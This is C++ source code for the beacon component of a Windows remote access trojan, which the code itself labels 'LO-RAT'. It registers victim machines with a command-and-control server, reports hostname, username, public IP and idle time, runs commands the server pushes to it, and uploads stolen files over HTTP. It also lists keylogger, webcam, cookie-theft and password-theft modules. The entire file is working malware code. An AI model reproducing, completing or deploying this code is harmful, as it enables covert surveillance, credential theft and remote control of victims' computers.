#include "beacon.h"
#include "config.h"
#include "crypto.h"
#include "utils.h"
#include <wininet.h>
#include <sstream>
#pragma comment(lib, "wininet.lib")

namespace Beacon {
    std::unordered_map<std::string, CommandHandler> handlers;
    bool registered = false;
    
    void RegisterHandler(const std::string& type, CommandHandler handler) {
        handlers[type] = handler;
    }
    
    bool HTTPSPost(const std::string& path, const std::string& body, std::string& response) {
        HINTERNET hInternet = InternetOpenA(USER_AGENT, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) return false;
        
        std::string host = C2_HOST;
        INTERNET_PORT port = C2_PORT;
        
        HINTERNET hConnect = InternetConnectA(hInternet, host.c_str(), port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (!hConnect) {
            InternetCloseHandle(hInternet);
            return false;
        }
        
        DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
        if (port == 443) flags |= INTERNET_FLAG_SECURE;
        
        HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path.c_str(), NULL, NULL, NULL, flags, 0);
        if (!hRequest) {
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return false;
        }
        
        std::string headers = "Content-Type: application/json\r\n";
        if (!Crypto::g_uuid.empty()) {
            headers += "X-Victim-UUID: " + Crypto::g_uuid + "\r\n";
        }
        
        BOOL sent = HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), 
                                     (LPVOID)body.c_str(), (DWORD)body.length());
        
        if (sent) {
            char buf[4096];
            DWORD read = 0;
            while (InternetReadFile(hRequest, buf, sizeof(buf), &read) && read > 0) {
                response.append(buf, read);
            }
        }
        
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return sent;
    }
    
    bool RegisterWithServer() {
        std::string pubKey = Crypto::GetPublicKeyPEM();
        
        std::stringstream ss;
        ss << "{";
        ss << "\"action\":\"register\",";
        ss << "\"pubkey\":\"" << pubKey << "\",";
        ss << "\"hostname\":\"" << Utils::GetHostname() << "\",";
        ss << "\"username\":\"" << Utils::GetUsername() << "\",";
        ss << "\"os\":\"" << Utils::GetOSVersion() << "\"";
        ss << "}";
        
        std::string response;
        if (!HTTPSPost(C2_BEACON_PATH, ss.str(), response)) return false;
        
        // Parse response: {"uuid":"...", "session_key":"base64_aes_key"}
        // Simplified parsing - in production use a real JSON parser
        size_t uuidPos = response.find("\"uuid\":\"");
        if (uuidPos != std::string::npos) {
            uuidPos += 8;
            size_t uuidEnd = response.find("\"", uuidPos);
            Crypto::g_uuid = response.substr(uuidPos, uuidEnd - uuidPos);
        }
        
        size_t keyPos = response.find("\"session_key\":\"");
        if (keyPos != std::string::npos) {
            keyPos += 15;
            size_t keyEnd = response.find("\"", keyPos);
            std::string keyB64 = response.substr(keyPos, keyEnd - keyPos);
            Crypto::g_sessionKey = Crypto::Base64Decode(keyB64);
        }
        
        registered = !Crypto::g_uuid.empty();
        return registered;
    }
    
    std::string BuildBeaconJSON() {
        std::stringstream ss;
        ss << "{";
        ss << "\"uuid\":\"" << Crypto::g_uuid << "\",";
        ss << "\"timestamp\":" << time(0) << ",";
        ss << "\"hostname\":\"" << Utils::GetHostname() << "\",";
        ss << "\"username\":\"" << Utils::GetUsername() << "\",";
        ss << "\"os\":\"" << Utils::GetOSVersion() << "\",";
        ss << "\"ip\":\"" << Utils::GetPublicIP() << "\",";
        ss << "\"idle_time\":" << GetLastInputInfo() << ",";
        ss << "\"modules\":[" 
           << "\"keylogger\",\"screen_rec\",\"webcam\",\"cookie_steal\","
           << "\"pass_steal\",\"live_screen\",\"wifi_info\",\"system_ctrl\"]";
        ss << "}";
        return ss.str();
    }
    
    void ParseCommands(const std::string& response) {
        // Simplified JSON parsing - extract commands array
        size_t cmdPos = response.find("\"commands\":[");
        if (cmdPos == std::string::npos) return;
        
        cmdPos += 12;
        size_t cmdEnd = response.find("]", cmdPos);
        std::string cmdArray = response.substr(cmdPos, cmdEnd - cmdPos);
        
        // Parse individual commands (simplified)
        size_t pos = 0;
        while ((pos = cmdArray.find("{", pos)) != std::string::npos) {
            size_t end = cmdArray.find("}", pos);
            std::string cmdObj = cmdArray.substr(pos, end - pos + 1);
            
            Command cmd;
            // Extract id
            size_t idPos = cmdObj.find("\"id\":\"");
            if (idPos != std::string::npos) {
                idPos += 6;
                size_t idEnd = cmdObj.find("\"", idPos);
                cmd.id = cmdObj.substr(idPos, idEnd - idPos);
            }
            // Extract type
            size_t typePos = cmdObj.find("\"type\":\"");
            if (typePos != std::string::npos) {
                typePos += 8;
                size_t typeEnd = cmdObj.find("\"", typePos);
                cmd.type = cmdObj.substr(typePos, typeEnd - typePos);
            }
            // Extract params
            size_t paramsPos = cmdObj.find("\"params\":");
            if (paramsPos != std::string::npos) {
                paramsPos += 9;
                size_t paramsEnd = cmdObj.find_last_of("}");
                cmd.params = cmdObj.substr(paramsPos, paramsEnd - paramsPos);
            }
            
            auto it = handlers.find(cmd.type);
            if (it != handlers.end()) {
                it->second(cmd);
            }
            
            pos = end + 1;
        }
    }
    
    bool SendBeacon() {
        if (!registered && !RegisterWithServer()) return false;
        
        std::string body = BuildBeaconJSON();
        std::vector<BYTE> iv;
        std::vector<BYTE> encrypted = Crypto::AESEncrypt(
            std::vector<BYTE>(body.begin(), body.end()), 
            Crypto::g_sessionKey, iv
        );
        
        std::stringstream ss;
        ss << "{";
        ss << "\"uuid\":\"" << Crypto::g_uuid << "\",";
        ss << "\"iv\":\"" << Crypto::Base64Encode(iv) << "\",";
        ss << "\"data\":\"" << Crypto::Base64Encode(encrypted) << "\"";
        ss << "}";
        
        std::string response;
        if (!HTTPSPost(C2_BEACON_PATH, ss.str(), response)) return false;
        
        ParseCommands(response);
        return true;
    }
    
    bool UploadFile(const std::string& cmdId, const std::string& filename, const std::vector<BYTE>& data) {
        std::string boundary = "----LO-RAT-" + std::to_string(time(0));
        
        std::stringstream body;
        body << "--" << boundary << "\r\n";
        body << "Content-Disposition: form-data; name=\"uuid\"\r\n\r\n";
        body << Crypto::g_uuid << "\r\n";
        body << "--" << boundary << "\r\n";
        body << "Content-Disposition: form-data; name=\"cmd_id\"\r\n\r\n";
        body << cmdId << "\r\n";
        body << "--" << boundary << "\r\n";
        body << "Content-Disposition: form-data; name=\"filename\"\r\n\r\n";
        body << filename << "\r\n";
        body << "--" << boundary << "\r\n";
        body << "Content-Disposition: form-data; name=\"data\"; filename=\"" << filename << "\"\r\n";
        body << "Content-Type: application/octet-stream\r\n\r\n";
        body.write((char*)data.data(), data.size());
        body << "\r\n--" << boundary << "--\r\n";
        
        std::string bodyStr = body.str();
        std::string response;
        
        HINTERNET hInternet = InternetOpenA(USER_AGENT, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) return false;
        
        HINTERNET hConnect = InternetConnectA(hInternet, C2_HOST, C2_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (!hConnect) { InternetCloseHandle(hInternet); return false; }
        
        DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
        if (C2_PORT == 443) flags |= INTERNET_FLAG_SECURE;
        
        HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", C2_UPLOAD_PATH, NULL, NULL, NULL, flags, 0);
        if (!hRequest) {
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return false;
        }
        
        std::string headers = "Content-Type: multipart/form-data; boundary=" + boundary + "\r\n";
        HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)bodyStr.c_str(), (DWORD)bodyStr.length());
        
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return true;
    }
    
    void Loop() {
        while (true) {
            SendBeacon();
            
            // Random jitter
            DWORD jitter = rand() % BEACON_JITTER_MS;
            Sleep(BEACON_INTERVAL_MS + jitter);
        }
    }
}